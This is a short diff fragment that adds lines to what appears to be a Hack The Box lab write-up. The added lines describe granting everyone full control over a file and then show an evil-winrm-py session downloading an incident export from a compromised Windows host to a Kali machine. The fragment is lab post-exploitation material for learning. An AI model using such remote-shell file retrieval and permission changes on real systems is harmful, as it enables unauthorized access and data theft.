@@ -585,3 +585,13 @@ Successfully processed 1 files; Failed processing 0 files
 PS C:\Users\jaylee.clifton\Documents\Tickets> 
 ```
 
+Ill copy the file over then give everyone full control over it
+
+```python
+evil-winrm-py PS C:\ProgramData> download Incident_4922_WSUS_Remediation_ViewExport.html .
+Downloading C:\ProgramData\Incident_4922_WSUS_Remediation_ViewExport.html: 64.0kB [00:00, 1.33GB/s]          
+[+] File downloaded successfully and saved as: /home/kali/htb/logging/Incident_4922_WSUS_Remediation_ViewExport.html
+```
+
+Then using my evil-winrm session i can download the file
+
